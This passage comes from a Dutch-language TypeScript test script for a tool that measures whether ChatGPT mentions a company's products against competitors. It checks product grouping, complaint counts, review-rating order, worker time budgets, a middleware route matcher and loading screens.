  // De opzet komt letterlijk uit de run van Gasservice Brabant van 23 augustus
  // 2026: 12 producten, waarvan 4 genoemd, 5 niet genoemd en 3 niet gevraagd.
  const score = (naam: string): ScoreRow => ({
    offering_id: naam,
    offering_name: naam,
    tone_index: 0,
    evidence_score: 50,
    answers: 1,
    visibility_score: null,
    source_domains: ["a.nl", "b.nl"],
  });
  const marktrij = (
    offering: string,
    naam: string,
    positie: number,
    van: number,
    eigen = false,
  ): MarketRow => ({
    offering_id: offering,
    party_name: naam,
    is_own_brand: eigen,
    position: positie,
    of_parties: van,
  });

  const scores = [score("Cv-ketel huren"), score("Cv-ketel storing"), score("Zonneboiler")];
  const market: MarketRow[] = [
    // Wel genoemd: plek 2 van 3, met Kemkens ervoor.
    marktrij("Cv-ketel huren", "Kemkens", 1, 3),
    marktrij("Cv-ketel huren", "Gasservice Brabant", 2, 3, true),
    marktrij("Cv-ketel huren", "Smit IDT", 3, 3),
    // Niet genoemd: vijf anderen wel.
    marktrij("Cv-ketel storing", "Kemkens", 1, 5),
    marktrij("Cv-ketel storing", "Warmte Centrum Brabant", 2, 5),
    marktrij("Cv-ketel storing", "VSB", 3, 5),
    // Zonneboiler: geen enkele marktrij, dus niet gevraagd.
  ];
  const antwoorden: AnswerRow[] = [
    {
      id: "a1",
      offering_id: "Cv-ketel storing",
      block: "aanbod",
      question: "Hoe wordt er over dit bedrijf gepraat?",
      answer_text: "…",
      tone: "gemengd",
      pros: ["snelle en vakkundige oplossing", "netjes werken"],
      cons: [
        "onverwacht hoge reparatierekening",
        "geen prijsindicatie vooraf",
        "nauwelijks dienstspecifieke klantfeedback over storingen",
      ],
      cited_urls: [],
    },
  ];

  const views = buildOfferingViews({ scores, answers: antwoorden, market });
  const groepen = groupOfferings(views);

  eq("één product waar ChatGPT je noemt", String(groepen.genoemd.length), "1");
  eq("één waar hij anderen noemt", String(groepen.nietGenoemd.length), "1");
  // ⚠️ Niet gevraagd staat náást niet genoemd. Een product waarover we de vraag
  // niet stelden is een gat in de meting, geen gat in de markt.
  eq("en één waar niets gevraagd is", String(groepen.nietGevraagd.length), "1");

  const genoemd = groepen.genoemd[0];
  eq("de plek klopt", String(genoemd.position), "2");
  eq("en het aantal partijen ook", String(genoemd.ofParties), "3");
  eq("alleen wie vóór je staat telt als concurrent boven je", genoemd.ahead.join(","), "Kemkens");

  const gemist = groepen.nietGenoemd[0];
  eq("sta je er niet in, dan staan ze allemaal boven je", String(gemist.ahead.length), "3");
  ok("op de volgorde waarin ChatGPT ze noemde", gemist.ahead[0] === "Kemkens");

  // ⚠️ De plus- en minpunten komen uit de ANTWOORDEN. Op de echte run stond in
  // elke samenvattingsrij een lege lijst, omdat die pas vult bij twee of meer
  // vragen per product, en het scherm toonde daardoor niets.
  eq("de pluspunten komen uit het antwoord", String(gemist.pros.length), "2");
  // Twee echte bezwaren, en de derde regel gaat over ons eigen bewijs.
  eq("de echte bezwaren blijven bezwaren", String(gemist.cons.length), "2");
  eq("de opmerking over vindbaarheid staat apart", String(gemist.gaps.length), "1");

  ok(
    "de zin bij een gemist product noemt wie hij wél aanraadt",
    offeringSentence(gemist, "Gasservice Brabant").includes("Kemkens"),
  );
  ok(
    "en zegt dat jij er niet bij staat",
    offeringSentence(gemist, "Gasservice Brabant").includes("noemt hij niet"),
  );
  ok(
    "de zin bij een genoemd product noemt je plek",
    offeringSentence(genoemd, "Gasservice Brabant").includes("plek 2 van 3"),
  );

  const zin = marketSplitSentence(groepen, "Gasservice Brabant");
  ok("de telling boven de lijst is een telling", zin.includes("1 van de 2 gemeten producten"));
  // ⚠️ De noemer telt alleen de producten waar de vraag ook gesteld is. Drie
  // producten meetellen die we niet gevraagd hebben, zou de klant laten
  // schrikken van een gat dat wij zelf maakten.
  ok("en telt niet mee wat niet gevraagd is", !zin.includes("van de 3"));

  const gat = evidenceGapSentence(views);
  ok("het bewijsgat wordt benoemd", gat !== null && gat.includes("1 van je 3 producten"));
  ok(
    "en zegt erbij dat het geen kritiek op het werk is",
    gat !== null && gat.includes("geen kritiek"),
  );
});

group("de volgorde zet het probleem bovenaan", () => {
  const maak = (naam: string): ScoreRow => ({
    offering_id: naam,
    offering_name: naam,
    tone_index: 0,
    evidence_score: 50,
    answers: 1,
    visibility_score: null,
    source_domains: [],
  });
  const rijen = (naam: string, positie: number | null, van: number): MarketRow[] => {
    const uit: MarketRow[] = [];
    for (let i = 1; i <= van; i++) {
      const eigen = positie === i;
      uit.push({
        offering_id: naam,
        party_name: eigen ? "Jij" : `Ander ${i}`,
        is_own_brand: eigen,
        position: i,
        of_parties: van,
      });
    }
    return uit;
  };

  const views = buildOfferingViews({
    scores: [maak("A"), maak("B"), maak("C"), maak("D")],
    answers: [],
    market: [...rijen("A", 2, 3), ...rijen("B", 3, 5), ...rijen("C", null, 6), ...rijen("D", null, 3)],
  });
  const g = groupOfferings(views);

  // ⚠️ Binnen "niet genoemd" staat het drukste product bovenaan: daar worden de
  // meeste anderen wél genoemd en verlies je dus het meest.
  eq("het drukste gemiste product staat bovenaan", g.nietGenoemd[0].name, "C");
  // ⚠️ Binnen "wel genoemd" staat de slechtste plek bovenaan. Plek 3 van 5 is
  // slechter dan plek 2 van 3, en zonder de deling door het aantal partijen zou
  // die volgorde omdraaien.
  eq("en de slechtste plek staat bovenaan", g.genoemd[0].name, "B");
});

group("een patroon krijgt een telling en geen tweede lijst", () => {
  const view = (naam: string, cons: string[]) => ({
    offeringId: naam,
    name: naam,
    state: "genoemd" as const,
    position: 1,
    ofParties: 3,
    ahead: [],
    toneIndex: 0,
    evidenceScore: 50,
    pros: [],
    cons,
    gaps: [],
    sources: 1,
    answers: [],
    visibilityScore: null,
  });

  // ⚠️ Dezelfde sleutel als de synthese: "onverwacht hoge kosten" en "onverwacht
  // hoge reparatierekening" zijn één bezwaar. Als losse regels tellen ze allebei
  // als één product en verdwijnt het patroon dat er wél is.
  const views = [
    view("Cv-ketel kopen", ["onverwacht hoge kosten"]),
    view("Cv-ketel storing", ["onverwacht hoge reparatierekening"]),
    view("Zonneboiler", ["slordige rookgasafvoer"]),
  ];

  const spread = spreadOverOfferings(views, (v) => v.cons);
  eq("het bezwaar dat terugkomt staat bovenaan", String(spread[0].producten), "2");

  const geteld = countPerProduct(["onverwacht hoge kosten", "slordige rookgasafvoer"], views, (v) => v.cons);
  eq("de lijst van de synthese blijft de lijst", String(geteld.length), "2");
  eq("met de telling erachter", String(geteld[0].producten), "2");
  eq("en een incident telt als één", String(geteld[1].producten), "1");
  eq("de tekst blijft die van de synthese", geteld[0].punt, "onverwacht hoge kosten");
});

group("de reviewcijfers staan op bewijskracht, niet op hoogte", () => {
  const bron = (
    domain: string,
    rating: number | null,
    count: number | null,
    verified: boolean,
  ) => ({ domain, kind: "review", citations: 1, url: null, rating, rating_count: count, verified });

  const cijfers = reviewRatings([
    bron("inforeview.nl", 5, null, false),
    bron("klantenvertellen.nl", 8.2, 87, true),
    bron("google.com", 4.5, 451, false),
    bron("tlokb.nl", null, null, false),
  ]);

  eq("alleen bronnen met een cijfer", String(cijfers.length), "3");
  // ⚠️ Bevestigd gaat vóór, ook al is het cijfer op een andere schaal lager dan
  // een 5,0 op één review. Bevestigd betekent dat onze eigen crawler het cijfer
  // op de pagina heeft teruggevonden.
  eq("bevestigd staat bovenaan", cijfers[0].domain, "klantenvertellen.nl");
  eq("daarna het meest gedragen cijfer", cijfers[1].domain, "google.com");
});

// ════════════════════════════════════════════════════════════════════════════
console.log("\nDe tijdrijgrenzen van de werker (doorloop-huyberts.md punt 5)");

// De werker en de OpenAI-client zijn `server-only`, dus de constanten zelf
// importeren kan niet vanuit een kaal script. In plaats daarvan wordt de
// BRONCODE gelezen: dit vangt precies de fout die dit punt veroorzaakte,
// iemand die één getal in lib/openai/client.ts ophoogt zonder de rij in
// lib/jobs/worker.ts opnieuw door te rekenen, en dan blijven taken op
// 'running' staan omdat het platform de route hard afkapt.
group("de tijdgrenzen passen nog in elkaar", () => {
  const client = leesBestand("lib/openai/client.ts");
  const worker = leesBestand("lib/jobs/worker.ts");
  const config = leesBestand("lib/config.ts");
  const route = leesBestand("app/api/cron/worker/route.ts");

  const getal = (bron: string, patroon: RegExp): number | null => {
    const m = patroon.exec(bron);
    return m ? Number(m[1].replace(/_/g, "")) : null;
  };

  const timeoutMs = getal(client, /const TIMEOUT_MS = ([\d_]+);/);
  const callBudgetMs = getal(client, /export const CALL_BUDGET_MS = ([\d_]+);/);
  const critiqueReserveMs = getal(worker, /const CRITIQUE_RESERVE_MS = ([\d_]+);/);
  const saveMarginMs = getal(worker, /const SAVE_MARGIN_MS = ([\d_]+);/);
  const workerTimeBudgetMs = getal(
    config,
    /export const workerTimeBudgetMs = Number\(process\.env\.WORKER_TIME_BUDGET_MS \?\? ([\d_]+)\);/,
  );
  const maxDurationS = getal(route, /export const maxDuration = (\d+);/);

  ok(
    "alle zes getallen zijn nog te vinden (regex nog geldig na een herschrijving)",
    [timeoutMs, callBudgetMs, critiqueReserveMs, saveMarginMs, workerTimeBudgetMs, maxDurationS].every(
      (n) => n !== null,
    ),
    JSON.stringify({ timeoutMs, callBudgetMs, critiqueReserveMs, saveMarginMs, workerTimeBudgetMs, maxDurationS }),
  );

  if (
    timeoutMs !== null &&
    callBudgetMs !== null &&
    critiqueReserveMs !== null &&
    saveMarginMs !== null &&
    workerTimeBudgetMs !== null &&
    maxDurationS !== null
  ) {
    const maxDurationMs = maxDurationS * 1000;
    const heavyReserveMs = callBudgetMs + critiqueReserveMs + saveMarginMs;
    const lightReserveMs = callBudgetMs + saveMarginMs / 2;

    ok(
      "de timeout per poging blijft onder het totaalbudget van één aanroep",
      timeoutMs < callBudgetMs,
      `${timeoutMs} vs ${callBudgetMs}`,
    );
    ok(
      "een zware taak (schrijven + redactie) past nog volledig in het werkerbudget",
      heavyReserveMs < workerTimeBudgetMs,
      `${heavyReserveMs} vs ${workerTimeBudgetMs}`,
    );
    ok(
      "een lichte taak past nog volledig in het werkerbudget",
      lightReserveMs < workerTimeBudgetMs,
      `${lightReserveMs} vs ${workerTimeBudgetMs}`,
    );
    // Dezelfde marge die het ontwerp altijd al aanhield tegen de reaper: het
    // platform kapt de route hard af als workerTimeBudgetMs te dicht tegen
    // maxDuration aan zit.
    ok(
      "het werkerbudget houdt een echte marge tegen de routelimiet aan",
      workerTimeBudgetMs <= maxDurationMs - 30_000,
      `${workerTimeBudgetMs} vs ${maxDurationMs}`,
    );
  }
});

// ════════════════════════════════════════════════════════════════════════════
console.log("\nSnelheid: waar het scherm op wacht (28 augustus 2026)");

// ── De middleware-matcher ───────────────────────────────────────────────────
//
// ⚠️ Deze regex is de enige plek die bepaalt of een bezoeker zonder sessie op
// een beschermd scherm naar het inlogscherm gaat. Hij is op 28 augustus 2026
// uitgebreid zodat `/api/` er buiten valt: de middleware had daar niets te
// doen en kostte er wél een netwerkronde naar de Auth-server, vóór élke
// knopklik. Eén teken verkeerd in dit patroon zet óf de bescherming uit óf de
// besparing terug, en allebei gebeurt zonder foutmelding. Vandaar deze test.
group("de middleware draait waar hij moet, en nergens anders", () => {
  const bron = leesBestand("middleware.ts");
  const gevonden = bron.match(/"(\/\(\(\?!.*)"/);
  ok("de matcher staat in middleware.ts", Boolean(gevonden));
  const patroon = new RegExp(`^${(gevonden?.[1] ?? "x").replace(/\\\\/g, "\\")}$`);

  // Wél: elk scherm dat de sessie nodig heeft, plus de auth-pagina's waar een
  // ingelogde bezoeker juist wéggestuurd wordt.
  for (const pad of [
    "/",
    "/login",
    "/register",
    "/merk",
    "/merk/abc-123",
    "/merk/abc-123/analytics/zoekverkeer",
    "/analyses/abc-123",
    "/instellingen",
    "/instellingen/koppelingen",
    "/beheer",
  ]) {
    ok(`draait op ${pad}`, patroon.test(pad));
  }

  // Niet: de API-routes doen hun eigen controle, en de statische bestanden
  // hebben er sowieso niets aan.
  for (const pad of [
    "/api/health",
    "/api/cron/worker",
    "/api/profiles/abc-123/plan",
    "/api/invites/accept",
    "/_next/static/chunks/main.js",
    "/favicon.ico",
    "/logo.svg",
  ]) {
    ok(`draait NIET op ${pad}`, !patroon.test(pad));
  }
});

// ── Elke route heeft een wachtvorm ─────────────────────────────────────────
//
// ⚠️ Zonder `loading.tsx` laat Next.js bij een klik de oude pagina staan tot de
// nieuwe klaar is. Er verandert dan letterlijk niets op het scherm, en dat
// leest als een app die hangt in plaats van een app die laadt. Achttien
// schermen misten er één, waaronder alle vijf de schermen uit de zijbalk.
//
// De vier uitzonderingen zijn geen vergissing: drie zijn doorverwijzingen naar
// een ander adres (een wachtvorm zou oplichten en meteen weer weg zijn) en
// `/merk/nieuw` doet geen enkele query.
group("elk scherm met data heeft een wachtvorm", () => {
  const zonderWachtvorm = new Set([
    "app/(app)/analyses",
    "app/(app)/analyses/[id]/antwoorden",
    "app/(app)/analyses/[id]/rapport",
    "app/(app)/merk/nieuw",
  ]);

  const paginas = tsxOnder("app/(app)").filter((p) => p.endsWith("page.tsx"));
  ok("er zijn schermen gevonden", paginas.length > 20, `${paginas.length}`);

  for (const pagina of paginas) {
    const map = pagina.slice(0, -"/page.tsx".length);
    if (zonderWachtvorm.has(map)) {
      ok(`${map} is bewust zonder wachtvorm`, leesBestand(`${map}/loading.tsx`) === "");
      continue;
    }
    ok(`${map} heeft een wachtvorm`, leesBestand(`${map}/loading.tsx`) !== "");
  }
});

// ── De knop laat pas los als het scherm klopt ──────────────────────────────
//
// ⚠️ `router.refresh()` geeft niets terug om op te wachten. Een `finally` met
// `setBusy(false)` eromheen liep dus af terwijl de server nog bezig was: knop
// terug, venster dicht, melding in beeld, en de cijfers eronder nog een
// seconde in de oude stand. Dertien knoppen deden dat. Wie `useRefresh()`
// gebruikt, hoort `refreshing` ook echt te lezen, anders is de hook er wel
// maar doet hij niets.
group("wie useRefresh gebruikt, leest ook refreshing", () => {
  const gebruikers = tsxOnder("app/(app)").filter((p) =>
    leesBestand(p).includes("useRefresh()"),
  );
  ok("de hook wordt gebruikt", gebruikers.length >= 12, `${gebruikers.length}`);
  for (const bestand of gebruikers) {
    const bron = leesBestand(bestand);
    ok(`${bestand} leest refreshing`, /\|\|\s*refreshing/.test(bron));
  }
});

// ════════════════════════════════════════════════════════════════════════════
console.log(`\n${passed} geslaagd, ${failed} mislukt`);
if (failures.length > 0) {
  console.log("\nMislukt:");
  for (const f of failures) console.log(`  ✗ ${f}`);
}
process.exit(failed === 0 ? 0 : 1);
